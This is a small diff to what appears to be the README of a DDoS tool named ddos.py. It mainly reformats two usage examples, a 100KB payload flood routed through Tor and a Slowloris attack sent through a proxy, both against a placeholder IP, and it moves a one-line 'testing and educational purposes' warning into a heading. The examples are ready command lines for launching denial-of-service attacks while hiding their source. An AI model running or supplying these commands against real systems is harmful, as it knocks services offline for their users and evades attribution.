@@ -51,10 +51,9 @@ Option	Description
 ```
 Payload attack 100KB via Tor:
 python ddos.py --ip 1.2.3.4 -p 80 -payloada --set-size-payload 102400 --tor-ip 127.0.0.1 --tor-port 9050
+
 Slowloris attack via Proxy:
-
 python ddos.py --ip 1.2.3.4 -p 80 -slowa --proxy-ip 192.168.1.10 --proxy-port 1080
-Warning
-Use only for testing and educational purposes.
-
 ```
+## Warning
+Use only for testing and educational purposes.
